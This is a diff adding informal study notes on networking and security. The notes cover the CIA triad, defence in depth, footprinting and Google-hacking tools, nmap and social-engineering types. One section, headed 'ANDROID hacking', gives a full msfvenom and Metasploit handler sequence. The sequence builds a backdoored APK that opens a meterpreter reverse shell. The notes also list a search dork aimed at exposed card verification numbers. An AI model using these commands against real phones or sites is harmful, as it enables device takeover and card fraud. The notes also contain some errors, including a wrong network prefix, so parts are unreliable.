@@ -1,0 +1,126 @@
+==========================================Networking & security==========================================
+>>>There is always a trade of between security and functionality of the system...and decided by how much do we need each one of them
+
+>>>The CIA traid - fundamental security principle
+C - confedentially - only to authorized people
+I - integrity - maintained by hashing/encryption, auditing
+A - availability - availability to authorized user when they need it
+protecting the C, I and A of data & services
+
+>>>Authentication(+vely identified user...ex.username/password) v/s Authorization(allow to perform action after authenticated...implemented
+using rights, priviledges, permissions,etc)
+
+>>>Attack vectors
+1.Network-based
+2.Host-based
+DOS(Denial Of Service) attacks attempts to deny the use of computer systems and their data from their authorized user...DOS are for 
+data corruption or for damaging the computer system 
+
+>>Defense concepts --> "Defence in depth" startegy is the best..it's about defending the every component of network or system and it covers
+every part of system or network
+Three types of controls are involved
+1.Administrative control - defined by mgmt
+2.Technical or logical controls - firewalls, Intrusion detection systems,etc
+3.Physical controls
+
+Threat uses the vulnerabilities to diminish the system security and expose it...exposure is the vilneability that has been exploited
+Mitigations
+
+>>Security patches
+
+>>Footprinting -> info gathering
+types
+1.open source/passive info gathering
+2.active info gathering
+3.Anonymous footprinting
+4.pseudonymous footprinting
+
+tools --> 
+1.netcraft - to gather info
+2.link extractor
+
+Google hacking
+1.metagoofil
+2.golink scanner
+3.site digger
+4.google hacks
+5.BiLE suit
+6.google hack honeypot
+7.Gmapcatcher
+8.searchdiggity
+9.google hack DB
+10.Gooscan
+11.ExitTool
+
+===Google smart search and google hacking queries===
+cache:www.amazon.in
+intext:cvv
+inurl
+allintitle
+https://www.exploit-db.com/google-hacking-database/
+https://github.com/octalmage/googlehacks
+
+WHOIS LOOKUP
+DNS interrogation
+SHODAN search engine
+traceroute
+
+tamos.com
+dnsqueries.com
+
+after DNS info you should gather the network related info...
+
+10.0.0.0-10.255.255.255 (10/8 prefix) - for private network
+172.16.0.0-172.31.255.255 (172.16/8 prefix)
+192.168.0.0-192.168.255.255 (192.168/16 prefix)
+
+OS footprinting - nmap
+open ports will give you bunch of info
+
+Kevin mitnick
+
+keylogger
+
+MyIPTest.com
+
+>>nmap/zenmap -- basically to gather the info...Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, 
+what services (application name and version) those hosts are offering, 
+what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics.
+-need to careful while doing the intense scans...coz system administrator can easily know
+
+The harvester...
+DNSenum
+URLCrazy
+
+Types of social engineering
+1.Quid pro quo
+2.phishing
+3.baiting
+4.pretexting
+5.diversion theft
+
+>>Social enginnering attack - setoolkit
+- wireless access point attack vector
+
+RKhunter checks for the backdoor entries
+
+
+===========ANDROID hacking=============
+1.msfvenom -p android/meterpreter/reverse_tcp  LHOST=192.168.0.110 LPORT=4444 R > andro.apk 
+2.msfconsole
+msf  > use multi/handler
+msf exploit(handler) > set payload android/meterpreter/reverse_tcp
+msf exploit(handler) > set LHOST 192.168.0.110
+msf exploit(handler) > set LPORT 4444
+msf exploit(handler) > exploit
+
+port forwarding...of the routers
+
+================================================Python - networking and security================================================
+
+
+
+
+
+
+
